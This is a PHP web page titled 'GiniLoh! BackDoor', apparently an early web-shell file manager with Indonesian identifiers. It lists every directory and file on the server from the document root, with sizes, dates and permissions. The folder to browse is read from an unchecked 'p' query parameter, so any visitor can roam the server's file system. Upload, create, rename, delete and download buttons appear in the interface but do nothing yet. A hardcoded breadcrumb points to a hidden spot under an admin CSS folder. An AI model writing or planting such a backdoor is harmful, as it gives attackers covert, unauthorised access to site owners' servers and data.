<?php
    function Rootpath() {
        return $_SERVER['DOCUMENT_ROOT'];
    }

    function HitungFileSize($Size) {
        if ($Size < 1024) {
            return $Size . " byte" ;
        } else if ($Size < 1024 * 1024) {
            $Hasil = round($Size / 1024,2) ;
            return $Hasil . " KB" ;
        } else if ($Size < 1024 * 1024 * 1024) {
            $Hasil = round($Size / 1024 / 1024,2) ;
            return $Hasil . " MB" ;
        } else if ($Size < 1024 * 1024 * 1024 * 1024) {
            $Hasil = round($Size / 1024 / 1024 / 1024,2) ;
            return $Hasil . " GB" ;
        }
    }

    function BersihkanPath($Path) {
        $Char = substr($Path,0,1);

        if ($Char === "/") {
            $Path = substr ($Path,1);
        }

        return $Path;

    }

    function AmbilParentFolder ($Path) {
        $array = explode("/", $Path);
        $parent = null;
        $i=0;
        while($i < (count($array) - 1)) {
            $parent .= "/" . $array [$i] ;
            $i += 1 ;
        }
        return BersihkanPath($parent);
    }

    function ScanFolder($Path) {
        
        $LinkFile = NULL;
        $IsiTable = NULL;
        $TableFolder = NULL;
        $TableFile = Null;

        if (isset($_GET["p"]) === TRUE) {
            if ($_GET["p"] === "") {
                
            } else {
                $LinkFile .= $_GET["p"];
                $Path .= "/" . $_GET["p"];
            }
            $ListFile = scandir($Path);
        } else {
            $ListFile = scandir($Path);
        }
        
        foreach ($ListFile as $File) {
            if ($File === '.') {
                //Tidak Ada Perintah Di Eksekusi
            } elseif ($File === '..') {
                if ($Path === Rootpath()) {
                    // Kalau sama dengan RootPath, Dilewatin aja
                } else {
                    $IsiTable = '<tr>
                        <td><a href="?p='.AmbilParentFolder($_GET["p"]).'" class="text-decoration-none text-reset"><i class="bi bi-arrow-90deg-left"></i> ..</a></td>
                        <td></td>
                        <td></td>
                        <td></td>
                        <td></td>
                    </tr>';
                }
            } else {
                $FilePath = $Path . "/". $File;
                if (filetype($FilePath) == 'dir') {
                    $TableFolder .=    '<tr>
                                        <td><a href="?p='.BersihkanPath($LinkFile . "/" . $File).'" class="text-decoration-none text-reset"><i class="bi bi-folder"></i> '.$File.'</a></td>
                                        <td>Folder</td>
                                        <td>'.date ("d F Y H:i:s", filemtime($FilePath)).'</td>
                                        <td>'.decoct(fileperms($FilePath) & 0777).'</td>
                                        <td>
                                            <button type="button" class="btn btn-light" data-bs-toggle="tooltip" title="Rename">
                                                <i class="bi bi-pencil-square"></i></button>
                                            <button type="button" class="btn btn-light" data-bs-toggle="tooltip" title="Delete">
                                                <i class="bi bi-trash3"></i></button>
                                        </td>
                                    </tr>';
                } else {
                    $TableFile .=     '<tr>
                                        <td><i class="bi bi-file-earmark"></i> '.$File.'</td>
                                        <td>'.HitungFileSize(filesize($FilePath)).'</td>
                                        <td>'.date ("d F Y H:i:s", filemtime($FilePath)).'</td>
                                        <td>'.decoct(fileperms($FilePath) & 0777).'</td>
                                        <td>
                                            <button type="button" class="btn btn-light" data-bs-toggle="tooltip" title="Download">
                                                <i class="bi bi-download"></i></button>
                                            <button type="button" class="btn btn-light" data-bs-toggle="tooltip" title="Rename">
                                                <i class="bi bi-pencil-square"></i></button>
                                            <button type="button" class="btn btn-light" data-bs-toggle="tooltip" title="Delete">
                                                <i class="bi bi-trash3"></i></button>
                                        </td>
                                    </tr>';
                }
                
            }
        }
        $IsiTable .= $TableFolder . $TableFile ;
        return $IsiTable ;
    }
?>


<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>GiniLoh! BackDoor</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-gH2yIJqKdNHPEq0n4Mqa/HGKIhSkIHeL5AyhkYV8i59U5AR6csBvApHHNl/vI1Bx" crossorigin="anonymous">
    <link rel="icon" type="image/x-icon" href="https://i.ibb.co/Lgk23wW/favicon.png">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
</head>

<body>
    <div class="container">
        <section id="Header">
            <img src="https://i.ibb.co/d00fQ87/Logo-Back-Door.png" class="img-fluid rounded mx-auto d-block mb-4"
                alt="LogoBanner">
            <div class="row fs-5 fw-bold">
                <div class="col-8">
                    <nav aria-label="breadcrumb">
                        <ol class="breadcrumb">
                            <li class="breadcrumb-item"><i class="bi bi-house"></i></li>
                            <li class="breadcrumb-item">adminarea</li>
                            <li class="breadcrumb-item">css</li>
                            <li class="breadcrumb-item"></li>boostrap</li>
                        </ol>
                    </nav>
                </div>
                <div class="col-4 text-end">
                    <button type="button" class="btn btn-light btn-lg" data-bs-toggle="tooltip" title="Upload File">
                        <i class="bi bi-cloud-upload"></i></button>
                    <button type="button" class="btn btn-light btn-lg" data-bs-toggle="tooltip" title="Create New File">
                        <i class="bi bi-file-earmark-plus"></i></button>
                    <button type="button" class="btn btn-light btn-lg" data-bs-toggle="tooltip"
                        title="Create New Folder">
                        <i class="bi bi-folder-plus"></i></button>
                </div>
            </div>
        </section>

        <section id="Table">
            <table class="table table-hover mt-3">
                <thead>
                    <tr>
                        <th scope="col">Name</th>
                        <th scope="col">Size</th>
                        <th scope="col">Last Modified</th>
                        <th scope="col">Permission</th>
                        <th scope="col">Option</th>
                    </tr>
                </thead>
                <tbody>
                    <?php echo''.ScanFolder(Rootpath()) ;?>
                </tbody>
            </table>
        </section>

        <footer>
            <p class="text-center">© 2022 Copyright GiniLoh!</p>
        </footer>

    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-A3rJD856KowSb7dwlZdYEkO39Gagi7vIsF0jrRAoQmDKKtQBHUuLZ9AsSv4jD4Xa" crossorigin="anonymous">
    </script>
</body>

</html>